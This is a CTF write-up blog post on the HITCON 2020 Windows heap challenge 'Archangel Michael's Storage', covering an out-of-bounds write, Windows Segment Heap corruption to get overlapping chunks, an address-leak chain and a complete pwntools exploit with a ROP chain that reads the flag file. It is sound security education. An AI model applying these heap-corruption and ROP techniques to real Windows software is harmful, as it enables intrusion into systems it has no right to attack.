---
layout: post
title:  "HITCON 2020: Archangel Michael's Storage"
date:   2020-12-09
author: papa
tags: [ctf, pwning, reversing, userspace, windows]
---

PFS participated in HITCON this year, the first DEF CON 2021 prequalifier, which we ended in 19th place. During the CTF, I spent most of the time working on Archangel Michael's Storage, which I unfortunately didn't land during the event. I found this to be a fun challenge, having never looked at Windows heap internals before. After spending a few more hours to solve it, I decided to share the successes and failures below :) 

## Challenge Overview
The problem itself is your traditional userland menu heap challenge, with the twist being it's running on Windows Server 20H2. We are provided with the executable, [container](https://github.com/trailofbits/AppJailLauncher), startup batch script, dummy flag and important OS dlls (ntdll and kernel32).

The team also noted immediately that the startup script contained the following registry key addition:
```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MichaelStorage.exe" /v FrontEndHeapDebugOptions /t REG_DWORD /d 0x8 /f
```
This indicates that the executable is using the Windows Segment Heap, as opposed to the NT Heap, which will be discussed in detail later. But first, lets understand what the application actually does...

## MichaelStorage.exe
Running the executable presents you with the following menu screen:
```
*****************************
 Archangel Michael's Storage
*****************************
 1. Allocate Storage
 2. Set value to storage
 3. Get value from storage
 4. Destory Storage
 5. Exit
****************************
Your choice:
```
There are 4 storage types for you to allocate, set and destroy on the heap:
 - Type 0: `int32_t[]`
 - Type 1: `int64_t[]`
 - Type 2: `int8_t[]`
 - Type 3: `char *`

For types 0, 1 and 2, the allocated memory on the heap will store the size of the array in the first 8 bytes, followed by the array itself. Type 1 arrays always have 0x200 elements, but other types are user specified in size:
```
0x00: Size (8)
0x08: Array[Size]
```
For type 3, the size of the string is stored in the first 8 bytes, followed by a pointer to the string itself. Note that this is the only storage type whose value can be fetched, i.e. string written to `stdout`:
```
0x00: Size
0x08: Ptr ---
             |
             v
0x??: char[Size]
```

The program's `.data` section contains two 16 element arrays (max number of storages). When the program asks for an index of a storage to set, get or destroy these arrays are used:
 1. Metadata about each storage. Used to prevent UAF and double free type bugs:
    ```
     struct Storage {
        int64_t type;
        int64_t is_allocated;
        LPVOID heap_ptr;
    };
    ```
 2. The size of each storage. Any delta with the value here and the size stored on the heap causes the program to bail, preventing most buffer overflows.


## The Vulnerability
When setting values in type 1 arrays, (`int64_t[0x200]`) the index check uses a signed comparison. This allows for 8 byte OOB writes with negative index values:
```
CALL    get_long
MOV     qword ptr [RSP  + index],rax
CMP     qword ptr [RSP  + index],0x200
JGE     crash_and_burn
```

## Exploitation
From this point on, I'll go through chronologically the thought processes, successes and **hiccups** that occurred during the exploitation phase.

### The Plan
I'm not going to lie... after reversing and finding the vulnerability, I thought exploitation was going to be easy (whoops). It was immediately clear that we can use our OOB write to change the type 3 string pointer. This pointer can be both written to and read from, using the set and get menu options, so we have our arbritray read and write primitive.
```
0x00: Type 3 Size (8) | Type 3 Ptr (8) <---
0x10: ...                                  | Array[-4]
0x20: Type 1 Size (8) | Type 1 Array ------
```
Taking a look at previous Windows userland CTF challenges, it seemed that a heap address leak could be chained to find where ntdll is mapped and from there, where the binary, kernel32, peb, teb and stack is ([1](https://github.com/scwuaptx/CTF/blob/master/2019-writeup/hitcon/dadadb/dadadb.py), [2](https://github.com/saaramar/35C3_Modern_Windows_Userspace_Exploitation/blob/master/th1_exploit.py)). We can then ROP our way to victory.

So all we had to do now was leak an address. Since we can only get the data of type 3 strings, it became apparent that we needed to make one of these point to the address we want to leak (e.g. itself). Since there is ASLR, absolute addresses are not useful and therefore we needed  to perform a LSB overwrite, which our 8 byte OOB write is unable to do. Therefore, it became clear we needed to overlap a type 0 or type 2 storage with our type 3 string. Simple!

### A Quick Summary Of The Segment Heap
Rather than make this entire writeup about the Windows Segment Heap, I'll just call out the parts that were important when trying to solve the challenge. For a detailed description of all the internals, which I used throughout the challenge, please see [@MarkYason's](https://twitter.com/MarkYason) [blackhat talk](https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf).

The first important thing to note is the general architecture of the segmentation heap:
```

Low Fragmentation Heap (LFH)    Variable Size Allocation (VS)    Unmanaged Allocation
      <= 16 368 bytes                   <= 128 KB                > 128 KB & <= 508 KB
            |                                |                           | 
            v                                v                           v
--------------------------------------------------------------------------------------
                                        Backend
--------------------------------------------------------------------------------------
                                           |
                                           v
                                   NT Memory Manager
```
A backend segment manages ~1MB of memory. A group of pages can be allocated by the backend, known as as a backend block. One of these blocks can be used to create a LFH or VS, which manage the memory within the block itself.

I'll now discuss the different ways I tried to corrupt these structures to get overlapping allocations.

### Attempt #1 - LFH Block Overlap
The LFH reduces fragmentation by allocating similar sized blocks within each LFH subsegment. The size range is known as a bucket and an LFH subsegment will only be created on the 17th active allocation or 2040th total allocation of that bucket's size range. The backend block given to create the LFH subsegment starts with some metadata and is then divided into blocks of that bucket size. A bitmap is used to indicate which LFH block is busy or free, with block allocations being randomised:
```
0:004> dt ntdll!_HEAP_LFH_SUBSEGMENT
   +0x000 ListEntry        : _LIST_ENTRY
   +0x010 Owner            : Ptr64 _HEAP_LFH_SUBSEGMENT_OWNER
   +0x010 DelayFree        : _HEAP_LFH_SUBSEGMENT_DELAY_FREE
   +0x018 CommitLock       : Uint8B
   +0x020 FreeCount        : Uint2B
   +0x022 BlockCount       : Uint2B
   +0x020 InterlockedShort : Int2B
   +0x020 InterlockedLong  : Int4B
   +0x024 FreeHint         : Uint2B
   +0x026 Location         : UChar
   +0x027 WitheldBlockCount : UChar
   +0x028 BlockOffsets     : _HEAP_LFH_SUBSEGMENT_ENCODED_OFFSETS
   +0x02c CommitUnitShift  : UChar
   +0x02d CommitUnitCount  : UChar
   +0x02e CommitStateOffset : Uint2B
   +0x030 BlockBitmap      : [1] Uint8B         // BITMAP TO INDICATE WHICH BLOCKS ARE BUSY
```

Therefore, creating overlapping blocks works as follows:
1. Allocate and free 2040 type 1 storages.
2. Allocate another type 1 storage.
3. Use negative indexing to overwrite the `BlockBitmap`, setting block to free.
4. Make another allocation.

Although this works, after also defeating randomisation of block allocations via brutefore or using the `FreeHint`, overlapping blocks are only of the same size. Unfortunately for this challenge, the type 3 string storage is always 16 bytes and all other storages are greater than this. Therefore, we can't create a useful overlap.

### Attempt #2 - Extending Backend Block
After 14 hours and still no solves, all teams were granted a hint:
```
Use the back-end allocator and play with page range descriptors!
Coalesce everything! You will get overlap chunk!

REF: https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals.pdf
```

Taking a look at the structures of page range descriptors, we see the following:
```
0:004> dt ntdll!_HEAP_PAGE_RANGE_DESCRIPTOR 
   +0x000 TreeNode         : _RTL_BALANCED_NODE
   +0x000 TreeSignature    : Uint4B
   +0x004 UnusedBytes      : Uint4B
   +0x008 ExtraPresent     : Pos 0, 1 Bit
   +0x008 Spare0           : Pos 1, 15 Bits
   +0x018 RangeFlags       : UChar
   +0x019 CommittedPageCount : UChar
   +0x01a Spare            : Uint2B
   +0x01c Key              : _HEAP_DESCRIPTOR_KEY
   +0x01c Align            : [3] UChar
   +0x01f UnitOffset       : UChar
   +0x01f UnitSize         : UChar              // Number of Pages in the backend block

0:004> dt ntdll!_HEAP_DESCRIPTOR_KEY
   +0x000 Key              : Uint4B
   +0x000 EncodedCommittedPageCount : Pos 0, 16 Bits
   +0x000 LargePageCost    : Pos 16, 8 Bits
   +0x000 UnitCount        : Pos 24, 8 Bits     // Number of Pages in the backend block
```

The `UnitSize` and `Key.UnitCount` members, indicates how many pages are in the backend block. This sparked the idea to extend the length of freed backend blocks, such that on future allocatations, they will overlap already allocated blocks.

Therefore, to create overlapping blocks we do the following:
```
1. Allocate two backend blocks (easiest way is with a size > 128 KB).
    Page 0x00 ---------------------------------> Page 0xff
              [BUSY 0]
                      [BUSY 1]
                              [    FREE 0     ]

2. Free block 0 (block 1 prevents coalesce).
    Page 0x00 ---------------------------------> Page 0xff
              [FREE 1]
                      [BUSY 1]
                              [    FREE 0     ]

3. Use the OOB write to increase the number of pages of the free backend block.
    Page 0x00 ---------------------------------> Page 0xff
              [    FREE 1    ]
                      [BUSY 1]
                              [    FREE 0     ]

4. Allocate some more blocks, which re-allocates the freed block that is now bigger.
    Page 0x00 ---------------------------------> Page 0xff
              [BUSY 0][BUSY 2]
                      [BUSY 1]
                              [    FREE 0     ]
```

Although this works, there is one major issue. The type 3 storage we need to overlap has size 16 bytes, which means it will always be in either a LFH or VS subsegment. While this is fine by itself, all the heap allocation use the `HEAP_ZERO_MEMORY` flag, which means on creating an overlapping block, the LFH and VS metadata will be zeroed out. Therefore, any future LFH or VS allocations will cause the program to crash. We also can't use previously allocated storages, due to the size check described previously, i.e. the first 8 bytes on heap for each storage will now be zero and won't match what's stored in the programs `.data` sizes array.

### Attempt #3 - Smarter Extending Backend Block
The main issue in the previous strategy is that the LFH/VS gets corrupted. So why not recreate the LFH/VS on overlap allocation?

When freeing backend blocks, they get stored in a red-black tree. The page range descriptors from before are recast as the nodes of the tree, with nothing stopping overlapping blocks existing. Therefore, we can have a free node that perfectly fits a LFH/VS subsegment and another node whose pages overlap it.

Therefore, to create overlapping blocks we do the following:
```
1. Allocate four backend blocks, with the third being a VS subsegment.
    Page 0x00 ---------------------------------------------> Page 0xff
              [BUSY 0]
                      [BUSY 1]
                              [BUSY 2 (VS)]
                                           [BUSY 3]
                                                   [FREE 0]

2. Free block 0.
    Page 0x00 ---------------------------------------------> Page 0xff
              [FREE 1]
                      [BUSY 1]
                              [BUSY 2 (VS)]
                                           [BUSY 3]
                                                   [FREE 0]

3. Use the OOB write to increase the number of pages of the free backend block.
    Page 0x00 ---------------------------------------------> Page 0xff
              [           FREE 1          ]
                      [BUSY 1]
                              [BUSY 2 (VS)]
                                           [BUSY 3]
                                                   [FREE 0]

4. Free block 2 (block 1 and block 3 prevent coalesce).
    Page 0x00 ---------------------------------------------> Page 0xff
              [           FREE 1          ]
                      [BUSY 1]
                              [FREE 2 (VS)]
                                           [BUSY 3]
                                                   [FREE 0]

5. Allocate some more blocks, which re-allocates the first freed block that is now bigger.
   Note that BUSY 4 and FREE 2 are not perfectly aligned, since they would then have been using the same nodes of the free tree.
    Page 0x00 ---------------------------------------------> Page 0xff
              [BUSY 0][BUSY 2][  BUSY 4   ]
                      [BUSY 1]
                              [FREE 2 (VS)]
                                           [BUSY 3]
                                                   [FREE 0]

6. Allocate another VS subsegment, that uses the previous VS subsegment block.
    Page 0x00 ---------------------------------------------> Page 0xff
              [BUSY 0][BUSY 2][  BUSY 4   ]
                      [BUSY 1]
                              [BUSY 5 (VS)]
                                           [BUSY 3]
                                                   [FREE 0]
```

We now have the primitive to overlap a type 2 storage and a type 3 string (BUSY 4 and BUSY 5 above). We can begin the final stages of exploitation. This is where we were up to by the end of the CTF.

### Leaks
As described in the plan, we can use a LSB overwrite of our type 3 string pointer to start a chain of leaks. Specifically the leaks are as follows:
1. Leak heap address of string.
2. Calculate the `_HEAP_PAGE_SEGMENT` address. Remembering each backend segment manages 1 MB of memory, ronding to the nearest 1 MB boundary gives us the _HEAP_PAGE_SEGMENT.
3. Leak `&(_HEAP_SEG_CONTEXT->SegmentListHead)`. This is stored in `_HEAP_PAGE_SEGMENT->ListEntry`.
4. Leak an ntdll address. This was found at `_HEAP_SEG_CONTEXT->LfhContext->AffinityModArray`.
5. Calculate ntdll base adddress. Simple subtraction based on the leaked addresses offset into the module.
6. Leak `ntdll!PebLdr->InMemoryOrderModuleList`, which gives information about each module loaded into the process, such as where it is mapped.
7. Leak base address of MichaelStorage.exe.
8. Leak `kernel32!ReadFile` using MichaelStorage.exe's external references.
9. Leak the `PEB` through ntdll.
10. Calculate the `TEB`, which is a page after the `PEB`.
11. Leak the `StackBase` stored in the `TEB`.
12. Calculate the return address we want to overwrite. In this case we will overwrite the return address of `ReadFile`, which is the function that corrupts the stack itself.


### ROP
Since we have the address of kernel32, a simple CreateFile() + ReadFile() ROP chain can be used to store the flag in a type 3 string. We can then return back to normal execution of the program and fetch the flag.

## Completed Exploit
```
#!/usr/bin/env python3

from pwn import *
import sys

def allocate(p, type, size):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(type))
    p.recvuntil(":")
    p.sendline(str(size))

def set_value(p, storage_index, data_index, value):
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(storage_index))
    p.recvuntil(":")
    p.sendline(str(data_index)) # Note for type == 3, this is a size.
    p.recvuntil(":")
    p.sendline(value)

def get_value(p, storage_index):
    p.recvuntil(":")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(storage_index))
    p.recvuntil("Value:")
    return p.recvuntil("\r\n")[:-2]

def destroy(p, storage_index):
    p.recvuntil(":")
    p.sendline("4")
    p.recvuntil(":")
    p.sendline(str(storage_index))

# Helper primitive offsets
t2_offset = 0x4b018
t3_offset = 0x5c058

# Helper primitive functions
def write_absolute(p, where, what):
    byte_addr = p64(where)
    for j in range(8):
        set_value(p, 4, t3_offset-t2_offset+j, p8(byte_addr[j]))
    set_value(p, 5, len(what)+1, what)

def read_absolute(p, where):
    value = bytearray()
    i = 0
    while i < 8:
        # Set each byte of the address
        byte_addr = p64(where + i)
        set_value(p, 4, t3_offset-t2_offset, byte_addr)
        v = get_value(p, 5)
        if len(v) == 0:
            value += b'\x00'
            i += 1
        else:
            value += bytearray(v)
            i += len(v)
    return u64(value[:8])

#p = remote("localhost", 56746)
#p = remote("52.198.180.107", 56746)
p = process("MichaelStorage.exe")
# My local and server ntdll/kernel32 were the same. Just used for perf since
# leaking addresses is slow.
is_server = 0
recalc_server_leaks = 0

# First backend block that isn't VS
allocate(p, 0, 0xb000)  # 0

# Second backend block that isn't VS (STOP COALESCE)
allocate(p, 0, 0xb000)  # 1

# Third backend block that is VS
allocate(p, 1, 0xDEAD)  # 2 - OVERFLOW GADGET AT DETERMINSTIC OFFSET

# Fourth backend block that isn't VS (STOP COALESCE)
allocate(p, 0, 0x9000)  # 3

# Add first backend block to free tree
destroy(p, 0)

print("[+] Heap setup before corruption")

# Use bug to extend first backend block free tree node size
overflow_offset = 0x5c058
key_offset = 0x40 + 0x18
overflow_index = int((key_offset - overflow_offset) / 8)
set_value(p, 2, overflow_index, "7639512330019012610")

# Add VS block to free tree
destroy(p, 2)

print("[+] Heap corrupted")

allocate(p, 0, 0x9000)       # 0 - plugs first block
allocate(p, 0, 0x9000-0x400) # 2 - plugs second block

# Overlap the VS with type 2 data for overwriting
allocate(p, 2, 0x20000)      # 4

# Reallocate the VS
# The overlap allocation above messed up the page range descriptor.
# We fix it up here too
allocate(p, 1, 0xDEAD) # 5
overflow_offset = 0x5c058
key_offset = 0xb80 + 0x18
overflow_index = int((key_offset - overflow_offset) / 8)
set_value(p, 5, overflow_index, "1442559242757210383")
destroy(p, 5)

# Our arbritrary read/write primitve
allocate(p, 3, 0x200)    # 5 - primitive

print("[+] Created overlapping chunks")

# Can now overwrite every byte in the VS using the type 2 data (idx 4).
# We have an arbritrary read and write using the type 3 data which is a string
# pointer (idx 5).

# Lets get a heap leak
allocate(p, 2, 0x3d40-0x10)   # 6 - align leak target since null terminated writes
allocate(p, 3, 0x20)          # 7 - pointer to leak
to_leak_offset = 0x60008      # We can just make the pointer point to itself
set_value(p, 4, to_leak_offset - t2_offset, p8(0x0a))
partial = get_value(p, 7)
leaked_string = u64(b'\x28\x00'+partial+b'\x00\x00')
print(f"[+] Leaked string address on heap: {hex(leaked_string)}")

# Now leak ntdll - only do it once for server cause this is slow
ntdll_base = 0
if is_server and not recalc_server_leaks:
    ntdll_base = 0x7ffd7c990000
else:
    # 1. First leak pointer to &HeapBase.SegmentListHead (first thing in segment)
    seg_list_ptr = leaked_string & 0xFFFFFFFFFFF00000
    seg_list = read_absolute(p, seg_list_ptr)
    print(f"[+] Seg list at {hex(seg_list_ptr)}: {hex(seg_list)}")
    # 2. Now leak _HEAP_LFH_CONTEXT->AffinityModArray which is within ntdll
    ntdll_ptr = (seg_list & 0xFFFFFFFFFFFFF000) + 0x370
    ntdll_leak = read_absolute(p, ntdll_ptr)
    print(f"[+] Ntdll leak at {hex(ntdll_ptr)}: {hex(ntdll_leak)}")
    local_offset = 0x1207f9  #0x7fff784107f9 -> 0x7fff782f0000
    ntdll_base = ntdll_leak - local_offset

print(f"[+] Found ntdll base: {hex(ntdll_base)}")

# Bruteforce server ntdll offsets to try and figure out the base (only 8 bits)
# Didn't initially realise my ntdll was the same, so did this...
'''
if is_server:
    # TO REDO THE BRUTEFORCE, MOVE THIS LOOP TO BEFORE PROCESS CREATION
    for serv_leak_guess in range(0x8, 0xab):
        server_ntdll_leak = 0x7ffd7cab0780 # Re-leak if server restarted
        offset_guess = serv_leak_guess << 16 | 0x780
        ntdll_base = server_ntdll_leak - offset_guess
        print(f"[*] Ntdll base guess ({hex(offset_guess)}): {hex(ntdll_base)}")
        try:
            base_value = read_absolute(p, ntdll_base)
            if base_value & 0x5a4d != 0x5a4d: # MZ
                p.close()
                continue
        except:
            continue
'''

# Leak ntdll!PebLdr->InMemoryOrderModuleList
# https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data
bin_base = 0
if is_server and not recalc_server_leaks:
    bin_base = 0x7ff662c80000
else:
    pebldr_offset = 0
    pebldr_offset = 0x16b4c0
    pebldr = ntdll_base + pebldr_offset
    mod_list_ptr = pebldr + 0x20
    mod_list = read_absolute(p, mod_list_ptr)
    print(f"[+] ntdll!PebLdr->InMemoryOrderModuleList at {hex(mod_list_ptr)}: {hex(mod_list)}")

    # Leak the binary base address
    bin_base_ptr = mod_list + 0x20
    bin_base = read_absolute(p, bin_base_ptr)
print(f"[+] MichaelStorage.exe mapped at: {hex(bin_base)}")

# Leak kernel32
kerenl32_base = 0
if is_server and not recalc_server_leaks:
    kernel32_base = 0x7ffd7c680000
else:
    read_file_offset = 0x3000
    read_file_ptr = bin_base + read_file_offset
    read_file = read_absolute(p, read_file_ptr)
    print(f"[+] kernel32!ReadFile at {hex(read_file_ptr)}: {hex(read_file)}")
    kernel32_base = read_file - 0x24ee0
print(f"[+] Found kernel32 base: {hex(kernel32_base)}")

# Get the stack pointer
peb = read_absolute(p, ntdll_base + 0x16b448)-0x80
print(f"[+] Found peb: {hex(peb)}")
teb = peb + 0x1000
print(f"[+] Found teb: {hex(teb)}")
stack_base = read_absolute(p, teb+8)
print(f"[+] Found stack: {hex(stack_base)}")

# Find the return address we want to overwrite.
# Note: Slow on server :(
main_ret_addr = 0
main_ret = 0
offset = 0
for i in range(0x100, 0x1000, 0x100):
    if read_absolute(p, stack_base-i) != 0:
        offset = i
        main_ret_addr = stack_base-i
        break
for i in range(0x0, offset, 0x8):
    main_ret_addr += 0x8
    main_ret = read_absolute(p, main_ret_addr)
    if main_ret == bin_base+0x22f4:
        break
print(f"[+] Found ret addr to overwrite ({hex(main_ret_addr)}): {hex(main_ret)}")
read_ret_addr = main_ret_addr - 0xf0

# Buffer for flag file and flag itself
allocate(p, 3, 0x1000)              # 8 - buffer for strings and such
set_value(p, 8, 0x900, "C:\MichaelStorage\\flag.txt")
buf_offset = 0x600a0
buf = leaked_string & 0xfffffffffff00000 | buf_offset
print(f"[+] Buf address: {hex(buf)}")

# Build ROP chain
pop_rcx = ntdll_base + 0x8dd2f          # pop rcx; ret;
pop_rdx = kernel32_base + 0x24d92       # pop rdx; ret;
pop_r8  = ntdll_base + 0x69d3           # pop r8; ret;
pop_r9  = ntdll_base + 0x8b6e4          # pop r9; pop r10; pop r11; ret;
push_rax = kernel32_base + 0x019d23     # push rax; ret;
xchg_eax_ecx = ntdll_base + 0x65b0b     # xchg eax, ecx; ret;
create_file = kernel32_base + 0x24b50
read_file = kernel32_base + 0x24ee0
print(f"[+] CreateFile: {hex(create_file)}")

rop_chain = (p64(pop_rcx)+p64(buf)+
    p64(pop_rdx)+p64(0x80000000)+
    p64(pop_r8)+p64(0x0)+
    p64(pop_r8)+p64(0x0)+
    p64(pop_r8)+p64(0x1)+
    p64(pop_r9)+p64(0)+p64(0)+p64(0)+
    p64(create_file)+
    p64(pop_r9)+
    p64(0)+
    p64(0)+
    p64(0)+
    p64(pop_r9)+
    p64(3)+
    p64(0x128)+
    p64(0)+
    p64(pop_rcx)+
    p64(0)+
    p64(xchg_eax_ecx)+
    p64(pop_rdx)+
    p64(buf)+
    p64(pop_r8)+
    p64(0x100)+
    p64(pop_r9)+
    p64(0x0)+
    p64(0x0)+
    p64(0x0)+
    p64(read_file)+
    p64(bin_base+0x2050)+
    p64(0)+
    p64(0)+
    p64(0))

print(f"[+] ROP chain start: {hex(pop_rcx)}")

# Win
write_absolute(p, read_ret_addr, rop_chain)
flag = get_value(p, 8)
print(f"[!!!] FLAG: {flag}")
p.interactive()
```

## Conclusion
Overall I found this challenge to be a fun learning experience, being a great introduction to the Windows Segment Heap. I'd like to thank [Angelboy](https://twitter.com/scwuaptx) for creating this problem and can only hope for more Windows challenges in the future :)

